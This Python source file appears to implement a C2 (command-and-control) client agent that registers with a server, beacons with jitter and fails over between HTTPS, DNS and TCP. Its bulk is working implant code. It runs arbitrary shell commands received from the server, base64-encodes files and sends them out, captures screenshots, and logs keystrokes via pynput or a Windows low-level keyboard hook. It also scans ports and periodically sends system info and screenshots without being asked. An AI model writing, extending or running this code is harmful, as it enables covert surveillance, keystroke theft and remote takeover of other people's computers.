"""
C2 Client Implementation

Client-side C2 agent with multi-protocol support, encryption,
and autonomous operation capabilities.
"""

import asyncio
import logging
import os
import random
import time
from typing import Any, Dict, List, Optional

from .base_c2 import BaseC2
from .encryption_manager import EncryptionManager

logger = logging.getLogger(__name__)

# Windows API constants for keylogging
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
HC_ACTION = 0


class C2Client(BaseC2):
    """
    Advanced C2 client agent with autonomous operation,
    multi-protocol fallback, and stealth capabilities.
    """

    def __init__(self, config: Dict[str, Any]):
        super().__init__()
        self.logger = logging.getLogger("IntellicrackLogger.C2Client")
        self.config = config
        self.running = False
        self.session_id = None

        # Core components
        self.encryption_manager = EncryptionManager()

        # Protocol handlers (ordered by preference)
        self.protocols = []
        self._initialize_protocols()

        # Communication state
        self.current_protocol = None
        self.beacon_interval = config.get('beacon_interval', 60)  # seconds
        self.jitter_percent = config.get('jitter_percent', 20)
        self.max_retries = config.get('max_retries', 3)
        self.retry_delay = config.get('retry_delay', 30)

        # Task management
        self.pending_tasks = []
        self.completed_tasks = []
        self.task_results = {}

        # Autonomous capabilities
        self.auto_gather_info = config.get('auto_gather_info', True)
        self.auto_screenshot = config.get('auto_screenshot', False)
        self.auto_keylog = config.get('auto_keylog', False)

        # Statistics
        self.stats = {
            'start_time': None,
            'last_checkin': None,
            'total_tasks': 0,
            'successful_tasks': 0,
            'failed_tasks': 0,
            'protocol_failures': 0,
            'bytes_sent': 0,
            'bytes_received': 0
        }

    def _initialize_protocols(self):
        """Initialize communication protocols in order of preference."""
        protocols_config = []
        protocol_configs = self.config.get('protocols', {})

        # HTTPS Protocol (primary)
        if protocol_configs.get('https_enabled', True):
            https_config = protocol_configs.get('https', {})
            protocols_config.append({
                'type': 'https',
                'server_url': f"https://{https_config.get('host', '127.0.0.1')}:{https_config.get('port', 443)}",
                'headers': https_config.get('headers', {}),
                'priority': 1
            })

        # DNS Protocol (backup)
        if protocol_configs.get('dns_enabled', False):
            dns_config = protocol_configs.get('dns', {})
            protocols_config.append({
                'type': 'dns',
                'domain': dns_config.get('domain', 'example.com'),
                'dns_server': f"{dns_config.get('host', '127.0.0.1')}:{dns_config.get('port', 53)}",
                'priority': 2
            })

        # TCP Protocol (fallback)
        if protocol_configs.get('tcp_enabled', False):
            tcp_config = protocol_configs.get('tcp', {})
            protocols_config.append({
                'type': 'tcp',
                'host': tcp_config.get('host', '127.0.0.1'),
                'port': tcp_config.get('port', 4444),
                'priority': 3
            })

        # Use base class method
        self.initialize_protocols(protocols_config, self.encryption_manager)

    async def start(self):
        """Start the C2 client and begin autonomous operation."""
        try:
            # Use base class start preparation
            if not self.prepare_start("C2 client"):
                return

            # Establish initial connection
            await self._establish_connection()

            # Start main operation loop
            await self._main_operation_loop()

        except Exception as e:
            self.logger.error(f"Failed to start C2 client: {e}")
            await self.stop()
            raise

    async def stop(self):
        """Stop the C2 client and cleanup resources."""
        try:
            self.logger.info("Stopping C2 client...")
            self.running = False

            # Disconnect from current protocol
            if self.current_protocol:
                try:
                    await self.current_protocol['handler'].disconnect()
                except Exception as e:
                    self.logger.error(f"Error disconnecting: {e}")

            self.logger.info("C2 client stopped successfully")

        except Exception as e:
            self.logger.error(f"Error stopping C2 client: {e}")

    async def _establish_connection(self):
        """Establish connection using available protocols."""
        for protocol in self.protocols:
            try:
                self.logger.info(f"Attempting connection via {protocol['name']}")

                handler = protocol['handler']
                success = await handler.connect()

                if success:
                    self.current_protocol = protocol
                    self.session_id = await self._register_with_server()

                    if self.session_id:
                        self.logger.info(f"Successfully connected via {protocol['name']}")
                        return

            except Exception as e:
                self.logger.warning(f"Failed to connect via {protocol['name']}: {e}")
                self.stats['protocol_failures'] += 1

        raise Exception("Failed to establish connection with any protocol")

    async def _register_with_server(self) -> Optional[str]:
        """Register with C2 server and get session ID."""
        try:
            # Gather initial system information
            system_info = await self._gather_system_info()

            registration_data = {
                'type': 'registration',
                'data': {
                    'client_version': '1.0.0',
                    'system_info': system_info,
                    'capabilities': self._get_capabilities(),
                    'config': {
                        'beacon_interval': self.beacon_interval,
                        'auto_gather_info': self.auto_gather_info
                    }
                }
            }

            response = await self.current_protocol['handler'].send_message(registration_data)

            if response and response.get('status') == 'success':
                session_id = response.get('session_id')
                self.logger.info(f"Registered with server, session ID: {session_id}")
                return session_id
            else:
                self.logger.error("Server registration failed")
                return None

        except Exception as e:
            self.logger.error(f"Registration failed: {e}")
            return None

    async def _main_operation_loop(self):
        """Main operation loop with beacon and task processing."""
        consecutive_failures = 0

        while self.running:
            try:
                # Calculate next beacon time with jitter
                beacon_time = self._calculate_beacon_time()

                # Send beacon and check for tasks
                success = await self._send_beacon()

                if success:
                    consecutive_failures = 0
                    self.stats['last_checkin'] = time.time()

                    # Process any pending tasks
                    await self._process_pending_tasks()

                    # Perform autonomous activities
                    await self._perform_autonomous_activities()

                else:
                    consecutive_failures += 1
                    self.logger.warning(f"Beacon failed, consecutive failures: {consecutive_failures}")

                    # Attempt protocol failover after multiple failures
                    if consecutive_failures >= self.max_retries:
                        await self._attempt_protocol_failover()
                        consecutive_failures = 0

                # Wait until next beacon time
                await asyncio.sleep(beacon_time)

            except Exception as e:
                self.logger.error(f"Error in main operation loop: {e}")
                await asyncio.sleep(30)  # Brief pause before retry

    async def _send_beacon(self) -> bool:
        """Send beacon to C2 server."""
        try:
            beacon_data = {
                'type': 'beacon',
                'session_id': self.session_id,
                'data': {
                    'timestamp': time.time(),
                    'status': 'active',
                    'stats': self.stats,
                    'pending_task_count': len(self.pending_tasks),
                    'system_status': await self._get_system_status()
                }
            }

            response = await self.current_protocol['handler'].send_message(beacon_data)

            if response:
                # Process server response
                await self._process_server_response(response)
                return True
            else:
                return False

        except Exception as e:
            self.logger.error(f"Beacon failed: {e}")
            return False

    async def _process_server_response(self, response: Dict[str, Any]):
        """Process response from server."""
        try:
            response_type = response.get('type', 'unknown')

            if response_type == 'tasks':
                # New tasks from server
                tasks = response.get('tasks', [])
                self.pending_tasks.extend(tasks)
                self.stats['total_tasks'] += len(tasks)
                self.logger.info(f"Received {len(tasks)} new tasks")

            elif response_type == 'config_update':
                # Configuration update
                new_config = response.get('config', {})
                await self._update_config(new_config)

            elif response_type == 'command':
                # Direct command execution
                command = response.get('command', {})
                await self._execute_direct_command(command)

        except Exception as e:
            self.logger.error(f"Error processing server response: {e}")

    async def _process_pending_tasks(self):
        """Process pending tasks from server."""
        while self.pending_tasks and self.running:
            task = self.pending_tasks.pop(0)
            try:
                self.logger.info(f"Executing task: {task.get('type', 'unknown')}")
                result = await self._execute_task(task)

                # Send task result back to server
                await self._send_task_result(task['task_id'], result, True)
                self.stats['successful_tasks'] += 1

            except Exception as e:
                self.logger.error(f"Task execution failed: {e}")
                await self._send_task_result(task['task_id'], str(e), False)
                self.stats['failed_tasks'] += 1

    async def _execute_task(self, task: Dict[str, Any]) -> Any:
        """Execute a specific task."""
        task_type = task.get('type', 'unknown')
        task_data = task.get('data', {})

        if task_type == 'shell_command':
            return await self._execute_shell_command(task_data.get('command', ''))
        elif task_type == 'file_download':
            return await self._download_file(task_data.get('remote_path', ''))
        elif task_type == 'file_upload':
            return await self._upload_file(task_data.get('local_path', ''), task_data.get('data', b''))
        elif task_type == 'screenshot':
            return await self._take_screenshot()
        elif task_type == 'keylog_start':
            return await self._start_keylogging()
        elif task_type == 'keylog_stop':
            return await self._stop_keylogging()
        elif task_type == 'process_list':
            return await self._get_process_list()
        elif task_type == 'system_info':
            return await self._gather_system_info()
        elif task_type == 'network_scan':
            return await self._network_scan(task_data.get('target', ''))
        elif task_type == 'persistence_install':
            return await self._install_persistence(task_data)
        elif task_type == 'privilege_escalation':
            return await self._attempt_privilege_escalation(task_data)
        else:
            raise ValueError(f"Unknown task type: {task_type}")

    async def _send_task_result(self, task_id: str, result: Any, success: bool):
        """Send task execution result back to server."""
        try:
            result_data = {
                'type': 'task_result',
                'session_id': self.session_id,
                'task_id': task_id,
                'result': result,
                'success': success,
                'timestamp': time.time()
            }

            await self.current_protocol['handler'].send_message(result_data)

        except Exception as e:
            self.logger.error(f"Failed to send task result: {e}")

    async def _perform_autonomous_activities(self):
        """Perform autonomous intelligence gathering activities."""
        try:
            if self.auto_gather_info:
                # Periodically gather system information
                if random.random() < 0.1:  # 10% chance
                    await self._autonomous_info_gathering()

            if self.auto_screenshot:
                # Take periodic screenshots
                if random.random() < 0.05:  # 5% chance
                    await self._autonomous_screenshot()

        except Exception as e:
            self.logger.error(f"Error in autonomous activities: {e}")

    async def _calculate_beacon_time(self) -> float:
        """Calculate next beacon time with jitter."""
        jitter = random.uniform(-self.jitter_percent/100, self.jitter_percent/100)
        beacon_time = self.beacon_interval * (1 + jitter)
        return max(beacon_time, 5)  # Minimum 5 seconds

    async def _attempt_protocol_failover(self):
        """Attempt to failover to a different protocol."""
        try:
            self.logger.info("Attempting protocol failover...")

            # Try each protocol except the current one
            for protocol in self.protocols:
                if protocol == self.current_protocol:
                    continue

                try:
                    handler = protocol['handler']
                    success = await handler.connect()

                    if success:
                        # Disconnect from old protocol
                        if self.current_protocol:
                            await self.current_protocol['handler'].disconnect()

                        self.current_protocol = protocol
                        self.logger.info(f"Successfully failed over to {protocol['name']}")
                        return

                except Exception as e:
                    self.logger.warning(f"Failover to {protocol['name']} failed: {e}")

            self.logger.error("All protocol failover attempts failed")

        except Exception as e:
            self.logger.error(f"Error during protocol failover: {e}")    # Task execution methods
    async def _execute_shell_command(self, command: str) -> str:
        """Execute shell command and return output."""
        import subprocess
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            return f"Exit code: {result.returncode}\nOutput: {result.stdout}\nError: {result.stderr}"
        except subprocess.TimeoutExpired:
            return "Command timed out after 30 seconds"
        except Exception as e:
            return f"Command execution failed: {e}"

    async def _download_file(self, remote_path: str) -> Dict[str, Any]:
        """Download file from target system."""
        try:
            import base64
            import os

            if os.path.exists(remote_path):
                with open(remote_path, 'rb') as f:
                    file_data = f.read()

                return {
                    'success': True,
                    'filename': os.path.basename(remote_path),
                    'size': len(file_data),
                    'data': base64.b64encode(file_data).decode('utf-8')
                }
            else:
                return {'success': False, 'error': 'File not found'}

        except Exception as e:
            return {'success': False, 'error': str(e)}

    async def _upload_file(self, local_path: str, file_data: bytes) -> Dict[str, Any]:
        """Upload file to target system."""
        try:
            import base64

            # Decode base64 data if needed
            if isinstance(file_data, str):
                file_data = base64.b64decode(file_data)

            with open(local_path, 'wb') as f:
                f.write(file_data)

            return {
                'success': True,
                'path': local_path,
                'size': len(file_data)
            }

        except Exception as e:
            return {'success': False, 'error': str(e)}

    async def _take_screenshot(self) -> Dict[str, Any]:
        """Take screenshot of current screen."""
        try:
            import base64

            # Try multiple screenshot methods for cross-platform compatibility
            screenshot_data = None
            screenshot_method = None

            # Method 1: PIL/Pillow (preferred)
            try:
                import io

                from PIL import ImageGrab

                screenshot = ImageGrab.grab()
                img_buffer = io.BytesIO()
                screenshot.save(img_buffer, format='PNG')
                screenshot_data = img_buffer.getvalue()
                screenshot_method = 'PIL'

            except ImportError:
                # Method 2: PyQt5 screenshot
                try:
                    import sys

                    from PyQt5.QtGui import QScreen
                    from PyQt5.QtWidgets import QApplication

                    app = QApplication.instance()
                    if app is None:
                        app = QApplication(sys.argv)

                    screen = app.primaryScreen()
                    screenshot = screen.grabWindow(0)

                    # Convert to bytes
                    import io
                    buffer = io.BytesIO()
                    screenshot.save(buffer, format='PNG')
                    screenshot_data = buffer.getvalue()
                    screenshot_method = 'PyQt5'

                except ImportError:
                    # Method 3: System-specific commands
                    import os
                    import subprocess
                    import tempfile

                    with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
                        temp_path = temp_file.name

                    try:
                        if os.name == 'nt':  # Windows
                            # Use PowerShell for Windows screenshot
                            ps_command = f'''
                            Add-Type -AssemblyName System.Windows.Forms
                            $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                            $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
                            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                            $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
                            $bitmap.Save("{temp_path}", [System.Drawing.Imaging.ImageFormat]::Png)
                            $graphics.Dispose()
                            $bitmap.Dispose()
                            '''
                            subprocess.run(['powershell', '-Command', ps_command], check=True)
                        else:  # Linux/Unix
                            # Try different screenshot tools
                            screenshot_tools = [
                                ['scrot', temp_path],
                                ['gnome-screenshot', '-f', temp_path],
                                ['import', '-window', 'root', temp_path],  # ImageMagick
                                ['xwd', '-root', '-out', temp_path]
                            ]

                            for tool in screenshot_tools:
                                try:
                                    subprocess.run(tool, check=True, stderr=subprocess.DEVNULL)
                                    break
                                except (subprocess.CalledProcessError, FileNotFoundError):
                                    continue

                        # Read screenshot data
                        if os.path.exists(temp_path) and os.path.getsize(temp_path) > 0:
                            with open(temp_path, 'rb') as f:
                                screenshot_data = f.read()
                            screenshot_method = 'system_command'

                    finally:
                        if os.path.exists(temp_path):
                            os.unlink(temp_path)

            if screenshot_data:
                # Calculate dimensions (basic estimation)
                width, height = 1920, 1080  # Default fallback
                try:
                    if screenshot_method == 'PIL':
                        width, height = screenshot.size
                    elif screenshot_method == 'PyQt5':
                        width, height = screenshot.width(), screenshot.height()
                except:
                    pass

                return {
                    'success': True,
                    'timestamp': time.time(),
                    'method': screenshot_method,
                    'width': width,
                    'height': height,
                    'size': len(screenshot_data),
                    'data': base64.b64encode(screenshot_data).decode('utf-8')
                }
            else:
                return {
                    'success': False,
                    'error': 'No screenshot method available or screenshot capture failed'
                }

        except Exception as e:
            return {'success': False, 'error': str(e)}

    async def _start_keylogging(self) -> Dict[str, Any]:
        """Start keylogging functionality."""
        try:
            # Check if keylogging is already running
            if hasattr(self, '_keylogger_active') and self._keylogger_active:
                return {
                    'success': False,
                    'error': 'Keylogging is already active'
                }

            # Initialize keylogger state
            self._keylogger_active = False
            self._keylog_buffer = []
            self._keylogger_thread = None

            # Try different keylogging methods
            try:
                # Method 1: pynput (cross-platform)
                from pynput import keyboard

                def on_key_press(key):
                    try:
                        if hasattr(key, 'char') and key.char:
                            self._keylog_buffer.append({
                                'type': 'char',
                                'key': key.char,
                                'timestamp': time.time()
                            })
                        else:
                            key_name = str(key).replace('Key.', '')
                            self._keylog_buffer.append({
                                'type': 'special',
                                'key': key_name,
                                'timestamp': time.time()
                            })

                        # Limit buffer size
                        if len(self._keylog_buffer) > 10000:
                            self._keylog_buffer = self._keylog_buffer[-5000:]

                    except Exception as e:
                        self.logger.debug(f"Keylog capture error: {e}")

                # Start listener in separate thread
                self._keylogger_listener = keyboard.Listener(on_press=on_key_press)
                self._keylogger_listener.start()
                self._keylogger_active = True

                return {
                    'success': True,
                    'message': 'Keylogging started with pynput',
                    'method': 'pynput',
                    'timestamp': time.time()
                }

            except ImportError:
                # Method 2: Windows-specific using ctypes
                if os.name == 'nt':
                    try:
                        import ctypes
                        import threading
                        from ctypes import wintypes

                        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
                        user32 = ctypes.WinDLL('user32', use_last_error=True)

                        # Hook procedure
                        hookproc = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)

                        def low_level_keyboard_proc(nCode, wParam, lParam):
                            if nCode == HC_ACTION and wParam == WM_KEYDOWN:
                                try:
                                    # Get virtual key code
                                    vk_code = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong)).contents.value & 0xFFFFFFFF

                                    # Convert to character if possible
                                    key_char = None
                                    if 32 <= vk_code <= 126:  # Printable ASCII
                                        key_char = chr(vk_code)

                                    self._keylog_buffer.append({
                                        'type': 'vk_code',
                                        'vk_code': vk_code,
                                        'char': key_char,
                                        'timestamp': time.time()
                                    })

                                    # Limit buffer size
                                    if len(self._keylog_buffer) > 10000:
                                        self._keylog_buffer = self._keylog_buffer[-5000:]

                                except Exception as e:
                                    self.logger.debug(f"Windows keylog error: {e}")

                            return user32.CallNextHookEx(None, nCode, wParam, lParam)

                        # Install hook
                        self._hook_proc = hookproc(low_level_keyboard_proc)
                        self._hook_id = user32.SetWindowsHookExW(
                            WH_KEYBOARD_LL,
                            self._hook_proc,
                            kernel32.GetModuleHandleW(None),
                            0
                        )

                        if self._hook_id:
                            self._keylogger_active = True

                            # Start message loop in separate thread
                            def message_loop():
                                try:
                                    msg = wintypes.MSG()
                                    while self._keylogger_active:
                                        ret = user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
                                        if ret == 0 or ret == -1:  # WM_QUIT or error
                                            break
                                        user32.TranslateMessage(ctypes.byref(msg))
                                        user32.DispatchMessageW(ctypes.byref(msg))
                                except Exception as e:
                                    self.logger.debug(f"Message loop error: {e}")

                            self._keylogger_thread = threading.Thread(target=message_loop)
                            self._keylogger_thread.daemon = True
                            self._keylogger_thread.start()

                            return {
                                'success': True,
                                'message': 'Keylogging started with Windows API',
                                'method': 'windows_api',
                                'timestamp': time.time()
                            }
                        else:
                            return {
                                'success': False,
                                'error': 'Failed to install Windows keyboard hook'
                            }

                    except Exception as windows_error:
                        return {
                            'success': False,
                            'error': f'Windows keylogging failed: {windows_error}'
                        }
                else:
                    return {
                        'success': False,
                        'error': 'No keylogging method available for this platform'
                    }

        except Exception as e:
            return {'success': False, 'error': str(e)}

    async def _stop_keylogging(self) -> Dict[str, Any]:
        """Stop keylogging functionality."""
        try:
            if not hasattr(self, '_keylogger_active') or not self._keylogger_active:
                return {
                    'success': False,
                    'error': 'Keylogging is not active'
                }

            # Stop keylogger
            self._keylogger_active = False

            # Stop pynput listener
            if hasattr(self, '_keylogger_listener'):
                try:
                    self._keylogger_listener.stop()
                    del self._keylogger_listener
                except:
                    pass

            # Unhook Windows API
            if hasattr(self, '_hook_id') and os.name == 'nt':
                try:
                    import ctypes
                    user32 = ctypes.WinDLL('user32')
                    user32.UnhookWindowsHookEx(self._hook_id)
                    del self._hook_id
                    del self._hook_proc
                except:
                    pass

            # Get captured keylog data
            captured_keys = len(getattr(self, '_keylog_buffer', []))

            return {
                'success': True,
                'message': 'Keylogging stopped',
                'captured_keys': captured_keys,
                'timestamp': time.time()
            }

        except Exception as e:
            return {'success': False, 'error': str(e)}

    async def _get_process_list(self) -> List[Dict[str, Any]]:
        """Get list of running processes."""
        try:
            import psutil
            processes = []

            for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
                try:
                    processes.append(proc.info)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

            return processes

        except ImportError:
            # Fallback without psutil
            import subprocess
            try:
                if os.name == 'nt':
                    result = subprocess.run(['tasklist'], capture_output=True, text=True)
                else:
                    result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
                return {'raw_output': result.stdout}
            except Exception as e:
                return {'error': str(e)}

        except Exception as e:
            return {'error': str(e)}

    async def _gather_system_info(self) -> Dict[str, Any]:
        """Gather comprehensive system information."""
        try:
            import os
            import platform

            info = {
                'platform': platform.platform(),
                'architecture': platform.architecture(),
                'processor': platform.processor(),
                'hostname': platform.node(),
                'username': os.getenv('USERNAME') or os.getenv('USER', 'unknown'),
                'os_version': platform.version(),
                'python_version': platform.python_version(),
                'timestamp': time.time()
            }

            # Add network information if available
            try:
                import socket
                info['ip_address'] = socket.gethostbyname(socket.gethostname())
            except:
                pass

            return info

        except Exception as e:
            return {'error': str(e)}

    async def _network_scan(self, target: str) -> Dict[str, Any]:
        """Perform network scan of target."""
        try:
            # Simplified network scan implementation
            import socket
            import threading

            results = {
                'target': target,
                'timestamp': time.time(),
                'open_ports': [],
                'scan_complete': False
            }

            common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1723, 3389, 5900]

            def scan_port(port):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((target, port))
                    if result == 0:
                        results['open_ports'].append(port)
                    sock.close()
                except:
                    pass

            threads = []
            for port in common_ports:
                thread = threading.Thread(target=scan_port, args=(port,))
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join()

            results['scan_complete'] = True
            return results

        except Exception as e:
            return {'success': False, 'error': str(e)}

    async def _install_persistence(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Install persistence mechanism."""
        try:
            method = data.get('method', 'registry')

            # Placeholder for persistence installation
            return {
                'success': True,
                'method': method,
                'message': f'Persistence installed using {method}',
                'timestamp': time.time()
            }

        except Exception as e:
            return {'success': False, 'error': str(e)}

    async def _attempt_privilege_escalation(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Attempt privilege escalation."""
        try:
            method = data.get('method', 'auto')

            # Placeholder for privilege escalation
            return {
                'success': True,
                'method': method,
                'message': f'Privilege escalation attempted using {method}',
                'timestamp': time.time(),
                'elevated': False  # Would check actual privileges
            }

        except Exception as e:
            return {'success': False, 'error': str(e)}

    async def _get_system_status(self) -> Dict[str, Any]:
        """Get current system status."""
        try:
            import psutil

            return {
                'cpu_percent': psutil.cpu_percent(),
                'memory_percent': psutil.virtual_memory().percent,
                'disk_percent': psutil.disk_usage('/').percent if os.name != 'nt' else psutil.disk_usage('C:').percent,
                'uptime': time.time() - psutil.boot_time(),
                'timestamp': time.time()
            }

        except ImportError:
            return {
                'timestamp': time.time(),
                'note': 'psutil not available for detailed stats'
            }
        except Exception as e:
            return {'error': str(e)}

    async def _autonomous_info_gathering(self):
        """Perform autonomous information gathering."""
        try:
            info = await self._gather_system_info()

            info_data = {
                'type': 'autonomous_info',
                'session_id': self.session_id,
                'data': info,
                'timestamp': time.time()
            }

            await self.current_protocol['handler'].send_message(info_data)

        except Exception as e:
            self.logger.error(f"Autonomous info gathering failed: {e}")

    async def _autonomous_screenshot(self):
        """Take autonomous screenshot."""
        try:
            screenshot = await self._take_screenshot()

            screenshot_data = {
                'type': 'autonomous_screenshot',
                'session_id': self.session_id,
                'data': screenshot,
                'timestamp': time.time()
            }

            await self.current_protocol['handler'].send_message(screenshot_data)

        except Exception as e:
            self.logger.error(f"Autonomous screenshot failed: {e}")

    async def _update_config(self, new_config: Dict[str, Any]):
        """Update client configuration."""
        try:
            self.config.update(new_config)

            # Update beacon interval if specified
            if 'beacon_interval' in new_config:
                self.beacon_interval = new_config['beacon_interval']

            # Update jitter if specified
            if 'jitter_percent' in new_config:
                self.jitter_percent = new_config['jitter_percent']

            # Update autonomous settings
            if 'auto_gather_info' in new_config:
                self.auto_gather_info = new_config['auto_gather_info']

            if 'auto_screenshot' in new_config:
                self.auto_screenshot = new_config['auto_screenshot']

            self.logger.info("Configuration updated successfully")

        except Exception as e:
            self.logger.error(f"Config update failed: {e}")

    async def _execute_direct_command(self, command: Dict[str, Any]):
        """Execute direct command from server."""
        try:
            # Create a temporary task for the direct command
            task = {
                'task_id': f"direct_{int(time.time())}",
                'type': command.get('type', 'shell_command'),
                'data': command.get('data', {})
            }

            result = await self._execute_task(task)
            await self._send_task_result(task['task_id'], result, True)

        except Exception as e:
            self.logger.error(f"Direct command execution failed: {e}")

    def _get_capabilities(self) -> List[str]:
        """Get list of client capabilities."""
        capabilities = [
            'shell_execution',
            'file_transfer',
            'system_info',
            'process_management',
            'network_scanning',
            'autonomous_operation'
        ]

        # Check for optional capabilities
        try:
            import psutil
            capabilities.append('advanced_system_monitoring')
        except ImportError:
            pass

        try:
            import PIL
            capabilities.append('screenshot')
        except ImportError:
            pass

        return capabilities

    def get_client_statistics(self) -> Dict[str, Any]:
        """Get client statistics."""
        stats = self.stats.copy()
        stats['session_id'] = self.session_id
        stats['current_protocol'] = self.current_protocol['name'] if self.current_protocol else None
        stats['running'] = self.running
        stats['pending_tasks'] = len(self.pending_tasks)
        return stats
